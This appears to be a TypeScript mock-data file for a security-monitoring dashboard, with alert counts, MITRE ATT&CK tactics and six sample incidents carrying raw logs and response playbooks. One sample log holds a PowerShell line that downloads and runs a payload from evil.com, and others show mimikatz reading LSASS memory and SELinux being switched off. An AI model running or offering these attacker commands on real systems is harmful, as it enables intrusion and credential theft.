import type { AlertTrendDataPoint, MitreTactic, NotableEvent } from '../types';

export const SIEM_KPIS = {
    alertsToday: 12435,
    highSeverityIncidents: 18,
    endpointsMonitored: 52480,
    automatedRemediations: 9326,
};

export const ALERT_TREND_DATA: AlertTrendDataPoint[] = [
    { hour: 24, Critical: 5, High: 25, Medium: 120, Low: 400 },
    { hour: 23, Critical: 3, High: 22, Medium: 110, Low: 380 },
    { hour: 22, Critical: 4, High: 30, Medium: 130, Low: 420 },
    { hour: 21, Critical: 2, High: 18, Medium: 100, Low: 350 },
    { hour: 20, Critical: 6, High: 35, Medium: 140, Low: 450 },
    { hour: 19, Critical: 5, High: 28, Medium: 125, Low: 410 },
    { hour: 18, Critical: 7, High: 40, Medium: 150, Low: 480 }, // spike
    { hour: 17, Critical: 4, High: 33, Medium: 135, Low: 430 },
    { hour: 16, Critical: 3, High: 25, Medium: 115, Low: 390 },
    { hour: 15, Critical: 2, High: 20, Medium: 105, Low: 360 },
    { hour: 14, Critical: 4, High: 28, Medium: 120, Low: 400 },
    { hour: 13, Critical: 5, High: 32, Medium: 130, Low: 420 },
    { hour: 12, Critical: 3, High: 24, Medium: 110, Low: 380 },
    { hour: 11, Critical: 8, High: 55, Medium: 180, Low: 550 }, // major spike
    { hour: 10, Critical: 12, High: 60, Medium: 200, Low: 600 }, // peak
    { hour: 9, Critical: 7, High: 45, Medium: 170, Low: 520 },
    { hour: 8, Critical: 5, High: 38, Medium: 150, Low: 480 },
    { hour: 7, Critical: 4, High: 30, Medium: 130, Low: 430 },
    { hour: 6, Critical: 3, High: 25, Medium: 120, Low: 400 },
    { hour: 5, Critical: 2, High: 22, Medium: 110, Low: 370 },
    { hour: 4, Critical: 1, High: 15, Medium: 90, Low: 320 },
    { hour: 3, Critical: 2, High: 18, Medium: 95, Low: 340 },
    { hour: 2, Critical: 1, High: 12, Medium: 85, Low: 300 },
    { hour: 1, Critical: 3, High: 20, Medium: 100, Low: 350 },
];

export const MITRE_ATTACK_TACTICS: MitreTactic[] = [
    { id: 'TA0007', name: 'Discovery', count: 125 },
    { id: 'TA0002', name: 'Execution', count: 98 },
    { id: 'TA0005', name: 'Defense Evasion', count: 82 },
    { id: 'TA0006', name: 'Credential Access', count: 75 },
    { id: 'TA0003', name: 'Persistence', count: 61 },
    { id: 'TA0011', name: 'Command and Control', count: 43 },
    { id: 'TA0001', name: 'Initial Access', count: 22 },
];

export const NOTABLE_EVENTS: NotableEvent[] = [
    {
        id: 'EVT-001',
        timestamp: new Date(Date.now() - 2 * 60 * 1000).toISOString(),
        ruleName: 'Potential Credential Dumping: LSASS Memory Access',
        entity: 'CDE-DB-PROD-01',
        sourceIp: '10.1.5.22',
        tactic: { id: 'TA0006', name: 'Credential Access' },
        technique: { id: 'T1003.001', name: 'OS Credential Dumping: LSASS Memory' },
        severity: 'Critical',
        status: 'Remediation Successful',
        rawLog: '{"timestamp": "...", "process_name": "mimikatz.exe", "target_process": "lsass.exe", "action": "memory_read", "user": "SYSTEM"}',
        playbook: `
# SOAR Playbook: lsass-credential-dump
- name: Isolate Endpoint
  app: Crowdstrike
  action: contain_host
  parameters:
    hostname: CDE-DB-PROD-01

- name: Terminate Malicious Process
  app: Crowdstrike
  action: kill_process
  parameters:
    hostname: CDE-DB-PROD-01
    process_id: 1337

- name: Expire User Credentials
  app: ActiveDirectory
  action: reset_password
  parameters:
    user: compromised_user
        `
    },
    {
        id: 'EVT-002',
        timestamp: new Date(Date.now() - 5 * 60 * 1000).toISOString(),
        ruleName: 'C2 Beaconing Detected to Untrusted IP',
        entity: 'dev-workstation-1138',
        sourceIp: '192.168.10.54',
        tactic: { id: 'TA0011', name: 'Command and Control' },
        technique: { id: 'T1071.001', name: 'Application Layer Protocol: Web Protocols' },
        severity: 'High',
        status: 'Analyst Review',
        rawLog: '{"timestamp": "...", "destination_ip": "123.45.67.89", "port": 443, "protocol": "tls", "jarm_hash": "...", "beacon_interval": "5s"}',
        playbook: `
# SOAR Playbook: c2-beacon-detected
- name: Add IP to Firewall Blocklist
  app: PaloAlto
  action: add_to_blocklist
  parameters:
    ip_address: 123.45.67.89

- name: Create Jira Ticket for Analyst
  app: Jira
  action: create_issue
  parameters:
    project: SECINC
    summary: "C2 Beaconing from dev-workstation-1138"
`
    },
    {
        id: 'EVT-003',
        timestamp: new Date(Date.now() - 15 * 60 * 1000).toISOString(),
        ruleName: 'Impossible Travel Detected for Privileged User',
        entity: 'apac_db_admin',
        sourceIp: '203.0.113.15 (SGP)',
        tactic: { id: 'TA0001', name: 'Initial Access' },
        technique: { id: 'T1078', name: 'Valid Accounts' },
        severity: 'High',
        status: 'Remediation Successful',
        rawLog: '{"timestamp": "...", "user": "apac_db_admin", "login_status": "success", "country": "SGP", "previous_login": {"country": "AUS", "time": "30m ago"}}',
        playbook: `
# SOAR Playbook: impossible-travel
- name: Force User Session Logout
  app: Okta
  action: terminate_sessions
  parameters:
    user: apac_db_admin

- name: Force Password Reset
  app: Okta
  action: expire_password
  parameters:
    user: apac_db_admin
`
    },
    {
        id: 'EVT-004',
        timestamp: new Date(Date.now() - 35 * 60 * 1000).toISOString(),
        ruleName: 'Anomalous PowerShell Execution',
        entity: 'AD-CONTROLLER-02',
        sourceIp: '10.1.1.10',
        tactic: { id: 'TA0002', name: 'Execution' },
        technique: { id: 'T1059.001', name: 'Command and Scripting Interpreter: PowerShell' },
        severity: 'Medium',
        status: 'Analyst Review',
        rawLog: '{"timestamp": "...", "process_name": "powershell.exe", "command_line": "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload\')"}',
        playbook: `
# SOAR Playbook: malicious-powershell
- name: Create Jira Ticket for Analyst
  app: Jira
  action: create_issue
  parameters:
    project: SECINC
    summary: "Suspicious PowerShell on AD-CONTROLLER-02"
    
- name: Run Forensic Snapshot
  app: Velociraptor
  action: collect_artifacts
  parameters:
    hostname: AD-CONTROLLER-02
`
    },
     {
        id: 'EVT-005',
        timestamp: new Date(Date.now() - 55 * 60 * 1000).toISOString(),
        ruleName: 'Persistence via New Service Creation',
        entity: 'PAYMENT-GW-04',
        sourceIp: '10.2.8.41',
        tactic: { id: 'TA0003', name: 'Persistence' },
        technique: { id: 'T1543.003', name: 'Create or Modify System Process: Windows Service' },
        severity: 'High',
        status: 'Remediation Successful',
        rawLog: '{"timestamp": "...", "event_id": 4697, "service_name": "SysHealthSvc", "service_filename": "C:\\Windows\\Temp\\update.exe"}',
        playbook: `
# SOAR Playbook: persistence-new-service
- name: Disable Service
  app: WindowsDefender
  action: run_command
  parameters:
    hostname: PAYMENT-GW-04
    command: "sc.exe config SysHealthSvc start=disabled"

- name: Delete Service
  app: WindowsDefender
  action: run_command
  parameters:
    hostname: PAYMENT-GW-04
    command: "sc.exe delete SysHealthSvc"

- name: Quarantine File
  app: Crowdstrike
  action: quarantine_file
  parameters:
    hostname: PAYMENT-GW-04
    file_hash: "..."
`
    },
     {
        id: 'EVT-006',
        timestamp: new Date(Date.now() - 72 * 60 * 1000).toISOString(),
        ruleName: 'Security Policy Disabled (SELinux)',
        entity: 'CDE-API-PROD-03',
        sourceIp: '10.1.5.33',
        tactic: { id: 'TA0005', name: 'Defense Evasion' },
        technique: { id: 'T1562.001', name: 'Impair Defenses: Disable or Modify Tools' },
        severity: 'Critical',
        status: 'Analyst Review',
        rawLog: '{"timestamp": "...", "command": "setenforce 0", "user": "root", "tty": "pts/0"}',
        playbook: `
# SOAR Playbook: defense-evasion-selinux
- name: Isolate Endpoint
  app: Crowdstrike
  action: contain_host
  parameters:
    hostname: CDE-API-PROD-03

- name: Create P1 Jira Ticket
  app: Jira
  action: create_issue
  parameters:
    project: SECINC
    summary: "CRITICAL: SELinux disabled on CDE host"
    priority: "Highest"
`
    },
];